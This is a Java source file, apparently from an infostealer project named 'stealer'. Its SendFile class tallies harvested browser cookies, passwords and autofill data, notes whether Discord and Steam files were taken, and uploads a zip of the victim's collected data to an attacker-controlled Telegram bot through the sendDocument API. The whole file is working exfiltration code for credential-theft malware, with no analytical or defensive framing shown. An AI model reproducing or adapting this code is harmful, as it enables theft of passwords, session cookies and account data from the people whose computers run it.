package dev.kazi.stealer.node.nodes.file;

import java.io.OutputStream;
import java.io.IOException;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.File;
import dev.kazi.stealer.utils.Util;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class SendFile extends Node {

    public static String steam;
    public static String discord;
    public static String bot_token;
    public static String chat_id;
    public static boolean flag;
    
    public SendFile() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        try {
            if (this.getFolder().exists()) {
                Util.lineCounterCookies();
                Util.lineCounterPasswords();
                Util.lineCounterAutoFills();
                if (this.mergePath(this.getFolder(), "Discord").exists()) {
                    SendFile.discord = "discord files <:emoji:> ";
                }
                if (this.mergePath(this.getFolder(), "Steam").exists()) {
                    SendFile.steam = "steam files <:emoji:> ";
                }
                final File file = new File(System.getProperty("user.home") + "\\" + System.getenv("COMPUTERNAME") + ".zip");
                final File check = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\" + System.getenv("COMPUTERNAME"));
                final String urlString = "https://api.telegram.org/bot" + SendFile.bot_token + "/sendDocument";
                try {
                    final URL url = new URL(urlString);
                    final HttpURLConnection connection = (HttpURLConnection)url.openConnection();
                    connection.setDoOutput(true);
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=*****");
                    final String messageCaption = "Success";
                    final String postParameters = "--*****\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + SendFile.chat_id + "\r\n--*****\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + messageCaption + "\r\n--*****\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
                    try (final OutputStream outputStream = connection.getOutputStream();
                         final FileInputStream fis = new FileInputStream(file)) {
                        outputStream.write(postParameters.getBytes());
                        final byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            outputStream.write(buffer, 0, bytesRead);
                        }
                        outputStream.write("\r\n--*****--\r\n".getBytes());
                        outputStream.flush();
                    }
                    final int responseCode = connection.getResponseCode();
                    System.out.println("Response code: " + responseCode);
                    connection.disconnect();
                }
                catch (final Exception e) {
                    e.printStackTrace();
                }
                check.mkdir();
            }
        }
        catch (final IOException e2) {
            e2.printStackTrace();
        }
        SendFile.flag = true;
    }
    
    static {
        SendFile.steam = "";
        SendFile.discord = "";
        SendFile.flag = false;
    }
}
